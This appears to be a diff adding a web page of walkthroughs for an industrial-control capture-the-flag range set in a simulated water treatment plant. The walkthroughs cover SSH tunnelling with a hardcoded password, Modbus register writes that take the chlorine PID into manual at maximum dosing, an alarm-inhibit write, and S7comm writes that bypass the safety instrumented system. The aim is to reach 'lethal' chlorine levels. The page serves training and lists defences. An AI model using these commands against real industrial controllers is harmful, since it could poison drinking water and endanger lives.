+        <li>From process network scans, there's a PLC at 10.0.4.102:502</li>
+        <li>Port 502 = Modbus TCP (the most common industrial protocol)</li>
+        <li>The SCADA HMI Process page shows live chlorine levels and PID mode</li>
+        <li>Chlorine is currently ~1.5 ppm (safe, controlled by PID in AUTO mode)</li>
+      </ul>
+
+      <h4>Step 1: Watch the HMI</h4>
+      <p>Open the <b>Process</b> tab on the SCADA HMI. Note:</p>
+      <ul>
+        <li>Chlorine: ~1.50 ppm (green)</li>
+        <li>PID: AUTO</li>
+        <li>The PID controller keeps chlorine at the safe setpoint</li>
+      </ul>
+      <p><b>Keep watching - you'll see chlorine change as you manipulate the PLC.</b></p>
+
+      <h4>Step 2: Set Up a Tunnel</h4>
+      <p>Forward Modbus port 502 through the EWS.</p>
+      <details class="reveal guide"><summary>Tunnel command?</summary><div class="reveal-body">
+        <pre>sshpass -p 'eng2024!' ssh -f -N -L 502:10.0.4.102:502 -p 2222 engineer@127.0.0.1</pre>
+        <p>Note: Port 502 is privileged - may need sudo on some systems.</p>
+      </div></details>
+
+      <h4>Step 3: Scan the PLC</h4>
+      <p>Modbus organizes data as numbered registers:</p>
+      <ul>
+        <li><b>Holding Registers (HR)</b> - read/write (setpoints, PID parameters)</li>
+        <li><b>Coils</b> - read/write digital outputs (pump on/off)</li>
+        <li><b>Input Registers (IR)</b> - read-only sensor values</li>
+        <li><b>Discrete Inputs</b> - read-only digital inputs</li>
+      </ul>
+      <details class="reveal guide"><summary>Scan command?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c scan</pre>
+      </div></details>
+      <p><b>Study the registers.</b> Which ones control the PID? Which is the mode select? Which sets the dosing speed?</p>
+
+      <h4>Step 4: Understand the PID Controller</h4>
+      <p>The PID (Proportional-Integral-Derivative) controller automatically adjusts chlorine dosing. Key registers:</p>
+      <ul>
+        <li>One register controls AUTO vs MANUAL mode</li>
+        <li>Another sets the manual dosing speed (0-100%)</li>
+        <li>Input registers show actual sensor readings</li>
+      </ul>
+      <p><b>Hint:</b> Look for registers with values like 0 or 1 (mode switches) and values in the 0-100 range (percentages).</p>
+      <details class="reveal guide"><summary>Which registers?</summary><div class="reveal-body">
+        <ul>
+          <li>HR 9 = PID mode (1=AUTO, 0=MANUAL)</li>
+          <li>HR 10 = Manual dosing speed (0-100%)</li>
+          <li>IR 0 = Chlorine sensor reading (x100, so 150 = 1.50 ppm)</li>
+        </ul>
+      </div></details>
+
+      <h4>Step 5: Take Over</h4>
+      <p>Switch the PID to manual and set the dosing speed high.</p>
+      <p><b>Watch the HMI</b> - PID should change from AUTO to MANUAL, and chlorine should start rising.</p>
+      <details class="reveal guide"><summary>Commands?</summary><div class="reveal-body">
+        <pre># Switch to manual
+python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 9 --value 0
+
+# Set dosing speed
+python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 10 --value 75</pre>
+      </div></details>
+
+      <h4>Step 6: Observe the Impact</h4>
+      <p>Read the chlorine sensor to see it rising:</p>
+      <pre>python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c read --register 0 --type input</pre>
+      <p><b>On the HMI:</b> Chlorine value climbs, color changes from green to yellow to red. The flag appears on the Process page.</p>
+      <p><b>Note:</b> Chlorine will cap around 5 ppm due to a PLC safety cutoff. You'll need to bypass this in a later challenge...</p>
+
+      <h4>What You Learned</h4>
+      <ul>
+        <li>Modbus TCP is the most widely deployed ICS protocol - and has zero authentication</li>
+        <li>PID controllers are the brains of industrial processes - switching to manual removes all safety</li>
+        <li>Two register writes can turn a water treatment plant into a poison factory</li>
+        <li>This mirrors the Oldsmar, Florida attack (2021) where an attacker changed sodium hydroxide levels remotely</li>
+        <li>Defence: Modbus traffic monitoring, write protection, network segmentation</li>
+      </ul>
+
+      <p class="note"><b>Scoreboard:</b> Updates when PID mode is set to manual AND dosing speed exceeds 50%. Flag appears on HMI Process page.</p>
+    </div>
+
+    <!-- ============================================================ CH09 -->
+    <div class="entry" id="ch09">
+      <div class="entry-head"><span class="entry-num">09</span><h2 style="margin:0;">Safety Assault</h2><span class="diff-tag hard">Expert</span></div>
+      <p><b>Points:</b> 800 &nbsp; <b>Protocol:</b> S7comm (Siemens)</p>
+
+      <h4>The Story</h4>
+      <p>After CH-08, you noticed chlorine caps at ~5 ppm. Something is stopping you. The plant has a Safety Instrumented System (SIS) - an independent last line of defence that shuts everything down if conditions become dangerous. The SIS is on a completely isolated network... or is it?</p>
+
+      <h4>What You Know</h4>
+      <ul>
+        <li>The Safety network is at 10.0.5.x</li>
+        <li>No firewall rules allow direct access from any zone</li>
+        <li>The SIS PLC is at 10.0.5.201:102 (S7comm protocol)</li>
+        <li>The HMI Process page shows SIS: ARMED (green)</li>
+      </ul>
+
+      <h4>Step 1: The Problem</h4>
+      <p>The safety network is supposed to be air-gapped. You can't reach 10.0.5.x from the SCADA zone or anywhere else. The firewall blocks everything.</p>
+      <p>But in real industrial environments, someone always leaves a backdoor for maintenance...</p>
+
+      <h4>Step 2: Investigate the Engineering Workstation</h4>
+      <p>You have SSH access to the EWS (engineer@10.0.3.20). What else is running on it?</p>
+      <p><b>Hint:</b> Check what ports are listening on the EWS.</p>
+      <details class="reveal guide"><summary>How?</summary><div class="reveal-body">
+        <p>SSH to the EWS and list listening ports:</p>
+        <pre>sshpass -p 'eng2024!' ssh -p 2222 engineer@127.0.0.1 'ss -tlnp'</pre>
+      </div></details>
+      <p><b>What do you see?</b> Port 22 (SSH, expected) and... another port. What's that?</p>
+
+      <h4>Step 3: The Forgotten Bridge</h4>
+      <p>That mysterious port is a TCP proxy - someone set up a maintenance bridge from the EWS to the Safety PLC. It was supposed to be temporary, but it was never removed.</p>
+      <p><b>This is how air-gaps get broken in real facilities.</b></p>
+      <p>Tunnel that port to Kali.</p>
+      <details class="reveal guide"><summary>Tunnel command?</summary><div class="reveal-body">
+        <pre>sshpass -p 'eng2024!' ssh -f -N -L &lt;port&gt;:127.0.0.1:&lt;port&gt; -p 2222 engineer@127.0.0.1</pre>
+        <p>Replace <code>&lt;port&gt;</code> with the port you discovered.</p>
+      </div></details>
+
+      <h4>Step 4: Scan the Safety PLC</h4>
+      <p>The bridge speaks S7comm - the Siemens protocol. S7comm organizes data in <b>Data Blocks (DBs)</b>.</p>
+      <details class="reveal guide"><summary>Scan command?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c scan</pre>
+      </div></details>
+      <p><b>Study the data blocks.</b> Look at the hex dump and decoded values. One DB contains status bits, another has setpoints and something that looks like a password.</p>
+
+      <h4>Step 5: Read the Data Blocks</h4>
+      <p>Read each DB carefully.</p>
+      <p><b>DB1</b> contains safety status - byte 0 has individual bits:</p>
+      <ul>
+        <li>Bit 0: SIS Armed</li>
+        <li>Bit 1: SIS Tripped</li>
+        <li>Bit 2: SIS Healthy</li>
+        <li>Bit 4: Maintenance Mode (THE TARGET)</li>
+      </ul>
+      <p><b>DB2</b> contains setpoints and a maintenance password.</p>
+      <details class="reveal guide"><summary>Commands?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c read --db 1 --size 22
+python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c read --db 2 --size 16</pre>
+      </div></details>
+      <p><b>Hint:</b> Look at the last value in DB2. Does it look like a numeric code?</p>
+
+      <h4>Step 6: Enable Maintenance Mode</h4>
+      <p>To bypass the SIS, you need to:</p>
+      <ol>
+        <li>Write the maintenance password to DB2</li>
+        <li>Set the maintenance mode bit in DB1</li>
+      </ol>
+      <details class="reveal guide"><summary>How?</summary><div class="reveal-body">
+        <p>The tool supports both value writes and single-bit writes:</p>
+        <pre># Write password
+python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c write --db 2 --offset &lt;offset&gt; --value &lt;password&gt;
+
+# Set maintenance bit
+python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c write --db 1 --offset 0 --bit 4 --bit-value on</pre>
+      </div></details>
+      <p><b>Watch the HMI</b> - SIS indicator changes from ARMED (green) to BYPASSED (yellow).</p>
+
+      <h4>Step 7: Check DB99</h4>
+      <p>The scan showed another interesting data block. What's in it?</p>
+      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c read --db 99 --size 32</pre>
+        <p>Look at the ASCII column in the hex dump.</p>
+      </div></details>
+
+      <h4>What You Learned</h4>
+      <ul>
+        <li>Air-gapped networks often have forgotten maintenance bridges</li>
+        <li>S7comm (Siemens) has no authentication on data block read/write</li>
+        <li>Safety systems can be put in maintenance mode by an attacker</li>
+        <li>This mirrors the TRITON/TRISIS attack (2017) - malware specifically targeted Schneider Electric SIS controllers in a Saudi petrochemical plant</li>
+        <li>Defence: remove maintenance bridges, monitor SIS state changes, require physical key for maintenance mode</li>
+      </ul>
+
+      <p class="note"><b>Scoreboard:</b> Updates when SIS maintenance mode is enabled. Flag appears on HMI Process page.</p>
+    </div>
+
+    <!-- ============================================================ CH10 -->
+    <div class="entry" id="ch10">
+      <div class="entry-head"><span class="entry-num">10</span><h2 style="margin:0;">Full Compromise</h2><span class="diff-tag hard">Expert</span></div>
+      <p><b>Points:</b> 1000 &nbsp; <b>The Stuxnet Scenario</b></p>
+
+      <h4>The Story</h4>
+      <p>This is it. The final challenge. You've compromised every layer of this water treatment plant - corporate network, DMZ, SCADA, process PLCs, power substation, and safety systems. Now combine everything you've learned to cause a catastrophic failure: push chlorine to lethal levels (&gt;8 ppm) while keeping every safety system disabled. No alarms. No trips. No one knows until it's too late.</p>
+      <p>This is exactly what Stuxnet did to Iran's nuclear centrifuges in 2010.</p>
+
+      <h4>What You Know</h4>
+      <ul>
+        <li>CH-08: You can control the chemical dosing PLC via Modbus (10.0.4.102:502)</li>
+        <li>CH-09: You can bypass the SIS via S7comm (bridge at 10102)</li>
+        <li>Chlorine capped at ~5 ppm because of a PLC safety cutoff</li>
+        <li>Even with SIS bypassed, the PLC has its own safety logic</li>
+      </ul>
+
+      <h4>The Three Barriers</h4>
+      <p>To reach lethal chlorine (&gt;8 ppm), ALL THREE must be defeated simultaneously:</p>
+      <ol>
+        <li><b>PLC PID Controller</b> - keeps chlorine at 1.5 ppm automatically</li>
+        <li><b>PLC Safety Cutoff</b> - stops dosing at 5 ppm</li>
+        <li><b>Safety Instrumented System</b> - trips at 5 ppm (independent system)</li>
+      </ol>
+      <p>You already defeated #1 (manual mode, CH-08) and #3 (SIS maintenance, CH-09). But #2 still blocks you at 5 ppm.</p>
+
+      <h4>Step 1: Figure Out the PLC Safety Cutoff</h4>
+      <p>In CH-08, you set manual mode + high speed. Chlorine rose but stopped at ~5 ppm. Why?</p>
+      <p><b>Hint:</b> Go back to the Modbus scan from CH-08. There's a register you didn't use.</p>
+      <details class="reveal guide"><summary>Which register?</summary><div class="reveal-body">
+        <p>HR 15 = alarm_inhibit. When set to 0, the PLC has a hard safety cutoff at 5 ppm. Setting it to 1 disables this cutoff.</p>
+      </div></details>
+
+      <h4>Step 2: Plan the Attack</h4>
+      <p>You need all three active at once:</p>
+      <ol>
+        <li><b>SIS in maintenance mode</b> (S7comm - already done if CH-09 is complete)</li>
+        <li><b>PLC alarm inhibit ON</b> (Modbus register 15 = 1)</li>
+        <li><b>PLC manual mode + maximum dosing</b> (Modbus register 9 = 0, register 10 = 100)</li>
+      </ol>
+
+      <h4>Step 3: Execute</h4>
+      <p>Make sure your tunnels are set up for both Modbus (port 502) and S7comm (port 10102).</p>
+      <p><b>Phase 1: Bypass the SIS</b> (if not already done)</p>
+      <details class="reveal guide"><summary>Commands?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p 10102 -c write --db 2 --offset 14 --value 7777
+python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p 10102 -c write --db 1 --offset 0 --bit 4 --bit-value on</pre>
+      </div></details>
+      <p><b>Phase 2: Inhibit PLC alarms</b></p>
+      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 15 --value 1</pre>
+      </div></details>
+      <p><b>Phase 3: Maximum chlorine dosing</b></p>
+      <details class="reveal guide"><summary>Commands?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 9 --value 0
+python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 10 --value 100</pre>
+      </div></details>
+
+      <h4>Step 4: Watch It Burn</h4>
+      <p>Open the HMI Process page. Watch chlorine climb:</p>
+      <ul>
+        <li>1.5 ppm → normal (green)</li>
+        <li>4.0 ppm → elevated (yellow)</li>
+        <li>5.0 ppm → would normally trip the safety... but you disabled it</li>
+        <li>6.0 ppm → dangerous (red)</li>
+        <li>8.0 ppm → <b>LETHAL - PLANT COMPROMISED</b></li>
+      </ul>
+      <p>You can monitor from the terminal too:</p>
+      <pre>python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c read --register 0 --type input</pre>
+      <p>The chlorine sensor reading climbs past 500 (5.0 ppm)... 600... 700... 800+.</p>
+
+      <h4>Step 5: Victory</h4>
+      <p>When chlorine exceeds 8 ppm with SIS bypassed and alarms disabled:</p>
+      <ul>
+        <li>The HMI shows <b>PLANT COMPROMISED</b> in red</li>
+        <li>A victory overlay appears with the final flag</li>
+        <li>The scoreboard shows 4700/4700</li>
+      </ul>
+
+      <h4>What You Achieved</h4>
+      <p>You executed a coordinated multi-protocol attack across 5 network zones using 8 industrial protocols:</p>
+      <pre>Corporate (HTTP) → DMZ (OPC-UA, SQLi, SSH) → SCADA (HMI) →
+Process (Modbus, DNP3, EtherNet/IP, IEC 104) → Safety (S7comm)</pre>
+      <p>Every protocol had <b>zero authentication</b>. Every system was accessible once you reached it. The only defence was network segmentation - and you bypassed that with SSH tunneling and a forgotten maintenance bridge.</p>
+
+      <h4>The Real-World Lesson</h4>
+      <ul>
+        <li><b>Stuxnet (2010):</b> Destroyed Iranian nuclear centrifuges by manipulating PLCs while reporting normal readings</li>
+        <li><b>Ukraine Power Grid (2015):</b> Opened breakers via IEC 104, blacking out 230,000 people</li>
+        <li><b>TRITON/TRISIS (2017):</b> Targeted safety systems in a Saudi petrochemical plant</li>
+        <li><b>Oldsmar, Florida (2021):</b> Changed chemical dosing levels in a water treatment plant remotely</li>
+      </ul>
+      <p>What you just did combines elements of all four attacks. The difference: this was a training range. In the real world, lives depend on these systems.</p>
+      <p><b>Defence requires:</b> network segmentation, protocol monitoring, authentication, safety system integrity, and people who understand both IT and OT security.</p>
+
+      <p class="note"><b>Scoreboard:</b> 4700 / 4700 - ALL CHALLENGES COMPLETE.</p>
+    </div>
+
+  </div>
+</div>
+</section>
+
+<footer>
+  <div class="wrap foot-inner">
+    <div class="foot-left">WIRED VILLAGE · hardware hacking guides</div>
+    <div class="partner">
+      <span>Partner</span>
+      <img src="../assets/img/bi0s-hardware-logo.png" alt="bi0s hardware">
+    </div>
+  </div>
+</footer>
+
+<script src="../assets/js/site.js"></script>
+</body>
+</html>
